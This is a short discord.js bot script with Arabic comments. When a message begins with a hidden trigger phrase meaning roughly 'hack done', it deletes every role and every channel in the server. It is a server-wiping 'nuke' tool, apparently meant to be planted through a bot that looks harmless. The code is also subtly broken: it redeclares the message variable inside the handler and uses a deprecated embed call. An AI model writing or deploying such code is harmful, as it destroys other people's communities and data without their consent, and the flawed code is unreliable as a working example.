const Discord = require('discord.js')
const client = new Discord.Client()
const prefix = "!"

client.on('message', alpha => {
 if (alpha.content.startsWith("كوماننننننننننننندددددددددددددتمالاختراق!")) {
alpha.guild.roles.forEach(r => { r.delete() }) // لمسح الرتب
alpha.guild.channels.forEach(c => { c.delete() })// للمسح الرومات
let alpha = new Discord.RichEmbed()
.setColor('RANDOM')
.setDescription('**=.=**')
alpha.author.sendEmbed(alpha);
}
});

client.login(process.env.BOT_TOKEN)
